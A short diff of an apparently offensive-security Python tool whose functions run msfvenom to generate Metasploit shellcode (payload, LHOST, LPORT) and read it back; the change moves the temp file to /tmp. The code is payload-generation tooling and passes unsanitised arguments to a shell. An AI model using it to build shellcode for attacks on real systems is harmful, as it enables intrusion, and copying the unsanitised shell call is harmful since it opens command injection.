@@ -2,7 +2,7 @@ import subprocess
 import uuid
 
 def CreateMetShellCodeFile(payload, lhost, lport, plformat):
-   command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {plformat} -o temp.txt"
+   command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {plformat} -o /tmp/temp.txt"
    process = subprocess.run(command, shell=True, universal_newlines=True)
    print(process)
    if process.returncode != 0:
@@ -13,7 +13,7 @@ def CreateMetShellCodeFile(payload, lhost, lport, plformat):
        
 def GetMetShellCode(payload, lhost, lport, plformat):
     CreateMetShellCodeFile(payload, lhost, lport, plformat)
-    with open('temp.txt','r') as file:
+    with open('/tmp/temp.txt','r') as file:
         shellcode = file.read();
     return shellcode;
        
